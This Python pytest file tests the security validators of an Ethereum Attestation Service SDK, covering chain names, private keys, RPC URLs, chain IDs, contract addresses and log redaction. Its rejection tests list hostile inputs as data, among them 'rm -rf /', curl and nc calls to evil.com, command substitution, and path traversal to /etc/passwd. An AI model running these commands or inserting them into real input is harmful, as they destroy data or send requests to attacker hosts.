"""
Comprehensive security validation test suite for EAS SDK

Tests all security validation functions to ensure they properly protect against:
- Environment variable injection attacks
- Weak private key validation
- RPC URL manipulation and SSRF attacks
- Contract address substitution attacks
- Information disclosure through logging
- Chain ID confusion attacks
"""

import os
from unittest.mock import MagicMock, patch

import pytest

from src.main.EAS.security import (
    ContractAddressValidator,
    SecureEnvironmentValidator,
    SecurityError,
    create_secure_logger,
)


class TestSecureEnvironmentValidator:
    """Test security validation functions"""

    def test_chain_name_validation_success(self):
        """Test valid chain names"""
        valid_names = [
            "ethereum",
            "base",
            "polygon",
            "arbitrum-sepolia",
            "base-sepolia",
            "optimism",
            "test-network",
        ]

        for name in valid_names:
            result = SecureEnvironmentValidator.validate_chain_name(name)
            assert result == name.lower()

    def test_chain_name_validation_failures(self):
        """Test chain name validation against various attack vectors"""

        # Empty/None inputs
        with pytest.raises(SecurityError):
            SecureEnvironmentValidator.validate_chain_name("")

        with pytest.raises(SecurityError):
            SecureEnvironmentValidator.validate_chain_name(None)

        # Injection attempts
        injection_attempts = [
            "ethereum; rm -rf /",  # Command injection
            "chain\x00hidden",  # Null byte injection
            "chain\necho malicious",  # Newline injection
            "chain\rmalicious",  # Carriage return
            "../../../etc/passwd",  # Path traversal
            "${PWD}/malicious",  # Variable expansion
            "chain$(whoami)",  # Command substitution
            "chain`id`",  # Backtick command substitution
            "ethereum&&curl http://evil.com",  # Command chaining
            "eth|nc evil.com 1337",  # Pipe to network command
        ]

        for attempt in injection_attempts:
            with pytest.raises(SecurityError, match="Invalid chain name format"):
                SecureEnvironmentValidator.validate_chain_name(attempt)

        # Invalid format patterns (double dots, underscores, etc.)
        format_violations = ["network..backup", "chain__test"]

        for invalid in format_violations:
            with pytest.raises(SecurityError, match="Invalid chain name format"):
                SecureEnvironmentValidator.validate_chain_name(invalid)

        # Suspicious patterns (valid format but suspicious content)
        suspicious_names = [
            "admin-network",
            "root-chain",
            "system-net",
            "ethereum--dev",
        ]

        for suspicious in suspicious_names:
            with pytest.raises(
                SecurityError, match="Chain name contains suspicious pattern"
            ):
                SecureEnvironmentValidator.validate_chain_name(suspicious)

        # Length validation
        with pytest.raises(SecurityError, match="Chain name too long"):
            SecureEnvironmentValidator.validate_chain_name("a" * 51)

    def test_private_key_validation_success(self):
        """Test valid private keys"""
        # Use a private key with sufficient entropy for testing (not for real use!)
        valid_key = "0xa7c5ba7114b7119bb78dfc8e8ccd9f4ad8c6c9f2e8d7ab234fac8b1d5c7e9f12"

        with patch("src.main.EAS.security.Account.from_key") as mock_account:
            mock_account.return_value = MagicMock()
            with patch.object(
                SecureEnvironmentValidator, "_has_low_entropy", return_value=False
            ):
                result = SecureEnvironmentValidator.validate_private_key(valid_key)
                assert result == valid_key

    def test_private_key_validation_failures(self):
        """Test private key validation against attack vectors"""

        # Empty/None inputs
        with pytest.raises(SecurityError):
            SecureEnvironmentValidator.validate_private_key("")

        # Invalid format tests (expect format error)
        format_violations = [
            "invalid",
            "0x123",  # Too short
            "1234567890123456789012345678901234567890123456789012345678901234",  # No 0x
            "0xGGGG567890123456789012345678901234567890123456789012345678901234",  # Invalid hex
        ]

        for invalid in format_violations:
            with pytest.raises(SecurityError, match="Invalid private key format"):
                SecureEnvironmentValidator.validate_private_key(invalid)

        # Length violation test (expect length error)
        with pytest.raises(SecurityError, match="Private key too long"):
            SecureEnvironmentValidator.validate_private_key("0x" + "12" * 33)

        # Weak keys
        with patch("src.main.EAS.security.Account.from_key") as mock_account:
            mock_account.return_value = MagicMock()

            weak_keys = [
                "0x" + "00" * 32,  # All zeros
                "0x" + "ff" * 32,  # All ones
                "0x" + "01" * 32,  # Repeated pattern
            ]

            for weak_key in weak_keys:
                with pytest.raises(SecurityError, match="Weak private key"):
                    SecureEnvironmentValidator.validate_private_key(weak_key)

        # Cryptographically invalid keys
        with patch("src.main.EAS.security.Account.from_key") as mock_account:
            mock_account.side_effect = ValueError("Invalid key")

            with pytest.raises(SecurityError, match="Invalid private key"):
                SecureEnvironmentValidator.validate_private_key(
                    "0x1234567890123456789012345678901234567890123456789012345678901234"
                )

    def test_address_validation_success(self):
        """Test valid Ethereum addresses"""
        valid_addresses = [
            "0x1234567890123456789012345678901234567890",  # All lowercase
            "0xd796b20681bD6BEe28f0c938271FA99261c84fE8",  # Proper checksum address
        ]

        def mock_checksum(addr):
            # Return the proper checksum for known test address
            if addr.lower() == "0xd796b20681bd6bee28f0c938271fa99261c84fe8":
                return "0xd796b20681bD6BEe28f0c938271FA99261c84fE8"
            else:
                return addr.upper()

        with (
            patch("src.main.EAS.security.Web3.is_address", return_value=True),
            patch(
                "src.main.EAS.security.Web3.to_checksum_address",
                side_effect=mock_checksum,
            ),
        ):

            for addr in valid_addresses:
                result = SecureEnvironmentValidator.validate_address(addr)
                assert result == mock_checksum(addr.lower())

    def test_address_validation_failures(self):
        """Test address validation failures"""

        # Empty/None inputs
        with pytest.raises(SecurityError):
            SecureEnvironmentValidator.validate_address("")

        # Format violations (expect format error)
        format_violations = [
            "invalid",
            "0x123",  # Too short
            "1234567890123456789012345678901234567890",  # No 0x prefix
            "0xGGGG567890123456789012345678901234567890",  # Invalid hex
        ]

        for invalid in format_violations:
            with pytest.raises(SecurityError, match="Invalid address format"):
                SecureEnvironmentValidator.validate_address(invalid)

        # Length violation (expect length error)
        with pytest.raises(SecurityError, match="Address too long"):
            SecureEnvironmentValidator.validate_address("0x" + "12" * 21)

        # Web3 validation failure
        with patch("src.main.EAS.security.Web3.is_address", return_value=False):
            with pytest.raises(SecurityError, match="Invalid Ethereum address"):
                SecureEnvironmentValidator.validate_address(
                    "0x1234567890123456789012345678901234567890"
                )

    def test_rpc_url_validation_success(self):
        """Test valid RPC URLs"""
        valid_urls = [
            "https://mainnet.infura.io/v3/abc123",
            "https://eth-mainnet.g.alchemy.com/v2/xyz789",  # Use correct Alchemy domain
            "https://base.llamarpc.com",
        ]

        # Mock trusted domain check to allow test URLs
        with patch.object(
            SecureEnvironmentValidator, "_is_trusted_rpc_domain", return_value=True
        ):
            for url in valid_urls:
                result = SecureEnvironmentValidator.validate_rpc_url(url)
                assert result == url

    def test_rpc_url_validation_failures(self):
        """Test RPC URL validation failures"""

        # Empty/None inputs
        with pytest.raises(SecurityError):
            SecureEnvironmentValidator.validate_rpc_url("")

        # HTTPS requirement
        with pytest.raises(SecurityError, match="must use HTTPS"):
            SecureEnvironmentValidator.validate_rpc_url("http://insecure.com/rpc")

        # Invalid protocols
        invalid_protocols = [
            "ftp://example.com",
            "file:///etc/passwd",
            "javascript:alert(1)",
        ]

        for invalid in invalid_protocols:
            with pytest.raises(SecurityError):
                SecureEnvironmentValidator.validate_rpc_url(invalid)

        # Untrusted domains (when not in development)
        with patch.dict(os.environ, {}, clear=True):  # Clear EAS_ENVIRONMENT
            with pytest.raises(SecurityError, match="Untrusted RPC provider"):
                SecureEnvironmentValidator.validate_rpc_url(
                    "https://untrusted-provider.com/rpc"
                )

        # Suspicious patterns
        suspicious_urls = [
            "https://localhost/rpc",
            "https://127.0.0.1/rpc",
            "https://internal.company.com/rpc",
            "https://admin.network.com/rpc",
        ]

        # Test with non-development environment
        with patch.dict(os.environ, {"EAS_ENVIRONMENT": "production"}):
            for suspicious in suspicious_urls:
                with pytest.raises(
                    SecurityError, match="suspicious or private network pattern"
                ):
                    SecureEnvironmentValidator.validate_rpc_url(suspicious)

        # Allow localhost in development
        with patch.dict(os.environ, {"EAS_ENVIRONMENT": "development"}):
            result = SecureEnvironmentValidator.validate_rpc_url(
                "https://localhost:8545/rpc"
            )
            assert result == "https://localhost:8545/rpc"

    def test_chain_id_validation_success(self):
        """Test valid chain IDs"""
        valid_chain_ids = ["1", "42161", "8453", "137"]

        for chain_id in valid_chain_ids:
            result = SecureEnvironmentValidator.validate_chain_id(chain_id)
            assert result == int(chain_id)

        # Test with expected value
        result = SecureEnvironmentValidator.validate_chain_id("1", expected_chain_id=1)
        assert result == 1

    def test_chain_id_validation_failures(self):
        """Test chain ID validation failures"""

        # Empty/None inputs
        with pytest.raises(SecurityError):
            SecureEnvironmentValidator.validate_chain_id("")

        # Invalid formats
        invalid_chain_ids = [
            "0",  # Zero not allowed
            "-1",  # Negative not allowed
            "abc",  # Non-numeric
            "1.5",  # Float
            "01",  # Leading zero
        ]

        for invalid in invalid_chain_ids:
            with pytest.raises(SecurityError):
                SecureEnvironmentValidator.validate_chain_id(invalid)

        # Too large
        with pytest.raises(SecurityError, match="too large"):
            SecureEnvironmentValidator.validate_chain_id(str(2**33))

        # Mismatch with expected
        with pytest.raises(SecurityError, match="Chain ID mismatch"):
            SecureEnvironmentValidator.validate_chain_id("42161", expected_chain_id=1)

    def test_schema_uid_validation(self):
        """Test schema UID validation"""
        # Valid UID
        valid_uid = "0x" + "a" * 64
        result = SecureEnvironmentValidator.validate_schema_uid(valid_uid)
        assert result == valid_uid

        # Invalid UIDs
        invalid_uids = [
            "",
            "0x123",  # Too short
            "0x" + "g" * 64,  # Invalid hex
            "a" * 64,  # No 0x prefix
        ]

        for invalid in invalid_uids:
            with pytest.raises(SecurityError):
                SecureEnvironmentValidator.validate_schema_uid(invalid)

    def test_logging_sanitization(self):
        """Test sanitization of sensitive data for logging"""

        # Address sanitization
        address = "0x1234567890123456789012345678901234567890"
        sanitized = SecureEnvironmentValidator.sanitize_for_logging(address, "address")
        assert sanitized == "0x1234...7890"

        # Private key sanitization
        private_key = (
            "0x1234567890123456789012345678901234567890123456789012345678901234"
        )
        sanitized = SecureEnvironmentValidator.sanitize_for_logging(
            private_key, "private_key"
        )
        assert sanitized == "[PRIVATE_KEY_REDACTED]"

        # URL sanitization
        url = "https://mainnet.infura.io/v3/secret-key"
        sanitized = SecureEnvironmentValidator.sanitize_for_logging(url, "url")
        assert sanitized == "https://mainnet.infura.io/..."

        # Transaction hash sanitization
        tx_hash = "0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
        sanitized = SecureEnvironmentValidator.sanitize_for_logging(
            tx_hash, "transaction_hash"
        )
        assert sanitized == "0xabcdef12...567890"

        # General sanitization (hashing)
        general_data = "sensitive-information"
        sanitized = SecureEnvironmentValidator.sanitize_for_logging(
            general_data, "general"
        )
        assert sanitized.startswith("[HASH:")
        assert len(sanitized) == 15  # [HASH: + 8 chars + ]

        # Empty value
        sanitized = SecureEnvironmentValidator.sanitize_for_logging("", "address")
        assert sanitized == "[EMPTY]"


class TestContractAddressValidator:
    """Test contract address validation against known EAS contracts"""

    def test_valid_eas_contracts(self):
        """Test validation of known EAS contracts"""

        # Ethereum mainnet
        assert ContractAddressValidator.is_valid_eas_contract(
            "0xA1207F3BBa224E2c9c3c6D5aF63D0eb1582Ce587", 1
        )

        # Base mainnet
        assert ContractAddressValidator.is_valid_eas_contract(
            "0x4200000000000000000000000000000000000021", 8453
        )

        # Sepolia testnet
        assert ContractAddressValidator.is_valid_eas_contract(
            "0xC2679fBD37d54388Ce493F1DB75320D236e1815e", 11155111
        )

        # Case insensitive
        assert ContractAddressValidator.is_valid_eas_contract(
            "0xa1207f3bba224e2c9c3c6d5af63d0eb1582ce587", 1
        )

    def test_invalid_eas_contracts(self):
        """Test rejection of unknown contracts"""

        # Unknown contract address
        assert not ContractAddressValidator.is_valid_eas_contract(
            "0x1234567890123456789012345678901234567890", 1
        )

        # Valid address on wrong chain
        assert not ContractAddressValidator.is_valid_eas_contract(
            "0xA1207F3BBa224E2c9c3c6D5aF63D0eb1582Ce587",
            8453,  # Ethereum address on Base
        )

        # Unsupported chain
        assert not ContractAddressValidator.is_valid_eas_contract(
            "0xA1207F3BBa224E2c9c3c6D5aF63D0eb1582Ce587", 99999
        )

    def test_get_contract_type(self):
        """Test contract type identification"""

        # EAS Contract
        contract_type = ContractAddressValidator.get_contract_type(
            "0xA1207F3BBa224E2c9c3c6D5aF63D0eb1582Ce587", 1
        )
        assert contract_type == "EAS Contract"

        # Schema Registry
        contract_type = ContractAddressValidator.get_contract_type(
            "0xA7b39296258348C78294F95B872b282326A97BDF", 1
        )
        assert contract_type == "Schema Registry"

        # Unknown contract
        contract_type = ContractAddressValidator.get_contract_type(
            "0x1234567890123456789012345678901234567890", 1
        )
        assert contract_type is None


class TestSecurityIntegration:
    """Integration tests for security validation in EAS factory methods"""

    @patch("src.main.EAS.config.get_network_config")
    @patch("src.main.EAS.config.validate_chain_config")
    @patch("src.main.EAS.core.web3.Web3")
    def test_eas_from_chain_security_validation(
        self, mock_web3, mock_validate, mock_get_config
    ):
        """Test security validation in EAS.from_chain method"""
        from src.main.EAS.core import EAS

        # Mock configuration
        mock_config = {
            "rpc_url": "https://mainnet.infura.io/v3/test",
            "contract_address": "0xA1207F3BBa224E2c9c3c6D5aF63D0eb1582Ce587",
            "chain_id": 1,
            "contract_version": "0.26",
        }
        mock_get_config.return_value = mock_config

        # Mock Web3
        mock_w3 = mock_web3.return_value
        mock_w3.is_connected.return_value = True

        # Valid parameters should work
        valid_key = "0xa7c5ba7114b7119bb78dfc8e8ccd9f4ad8c6c9f2e8d7ab234fac8b1d5c7e9f12"
        valid_address = "0xd796b20681bD6BEe28f0c938271FA99261c84fE8"

        with (
            patch("src.main.EAS.security.Account.from_key"),
            patch("src.main.EAS.security.Web3.is_address", return_value=True),
            patch(
                "src.main.EAS.security.Web3.to_checksum_address",
                return_value=valid_address,
            ),
            patch.object(
                SecureEnvironmentValidator, "_has_low_entropy", return_value=False
            ),
        ):

            eas = EAS.from_chain("ethereum", valid_key, valid_address)
            assert eas is not None

        # Invalid chain name should fail
        with pytest.raises(ValueError, match="Security validation failed"):
            EAS.from_chain("ethereum; rm -rf /", valid_key, valid_address)

        # Invalid private key should fail
        with pytest.raises(ValueError, match="Security validation failed"):
            EAS.from_chain("ethereum", "invalid-key", valid_address)

        # Invalid address should fail
        with pytest.raises(ValueError, match="Security validation failed"):
            EAS.from_chain("ethereum", valid_key, "invalid-address")

    @patch.dict(
        os.environ,
        {
            "EAS_CHAIN": "ethereum",
            "EAS_PRIVATE_KEY": "0xa7c5ba7114b7119bb78dfc8e8ccd9f4ad8c6c9f2e8d7ab234fac8b1d5c7e9f12",
            "EAS_FROM_ACCOUNT": "0xd796b20681bD6BEe28f0c938271FA99261c84fE8",
        },
    )
    @patch("src.main.EAS.config.get_network_config")
    @patch("src.main.EAS.config.validate_chain_config")
    @patch("src.main.EAS.core.web3.Web3")
    def test_eas_from_environment_security_validation(
        self, mock_web3, mock_validate, mock_get_config
    ):
        """Test security validation in EAS.from_environment method"""
        from src.main.EAS.core import EAS

        # Mock configuration
        mock_config = {
            "rpc_url": "https://mainnet.infura.io/v3/test",
            "contract_address": "0xA1207F3BBa224E2c9c3c6D5aF63D0eb1582Ce587",
            "chain_id": 1,
            "contract_version": "0.26",
        }
        mock_get_config.return_value = mock_config

        # Mock Web3
        mock_w3 = mock_web3.return_value
        mock_w3.is_connected.return_value = True

        with (
            patch("src.main.EAS.security.Account.from_key"),
            patch("src.main.EAS.security.Web3.is_address", return_value=True),
            patch(
                "src.main.EAS.security.Web3.to_checksum_address",
                return_value="0xd796b20681bD6BEe28f0c938271FA99261c84fE8",
            ),
            patch.object(
                SecureEnvironmentValidator, "_has_low_entropy", return_value=False
            ),
        ):

            eas = EAS.from_environment()
            assert eas is not None

    @patch.dict(
        os.environ,
        {
            "EAS_CHAIN": "ethereum; rm -rf /",  # Injection attempt
            "EAS_PRIVATE_KEY": "0x1234567890123456789012345678901234567890123456789012345678901234",
            "EAS_FROM_ACCOUNT": "0x1234567890123456789012345678901234567890",
        },
    )
    def test_environment_injection_prevention(self):
        """Test that environment variable injection is prevented"""
        from src.main.EAS.core import EAS

        with pytest.raises(ValueError, match="dangerous patterns"):
            EAS.from_environment()


class TestSecureLogging:
    """Test secure logging functionality"""

    def test_secure_logger_creation(self):
        """Test creation of secure logger with filtering"""
        logger = create_secure_logger("test_logger")
        assert logger.name == "test_logger"

        # Verify filter is added
        assert len(logger.filters) > 0

    def test_log_message_sanitization(self):
        """Test that sensitive data is sanitized in log messages"""
        logger = create_secure_logger("test_sanitization")

        # This would normally require capturing log output, but we can test
        # the filter logic by creating a log record manually
        import logging

        record = logging.LogRecord(
            name="test",
            level=logging.INFO,
            pathname="",
            lineno=0,
            msg="Private key: 0x1234567890123456789012345678901234567890123456789012345678901234",
            args=(),
            exc_info=None,
        )

        # Apply filter
        for log_filter in logger.filters:
            log_filter.filter(record)

        assert "[PRIVATE_KEY_REDACTED]" in record.msg
        assert (
            "0x1234567890123456789012345678901234567890123456789012345678901234"
            not in record.msg
        )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
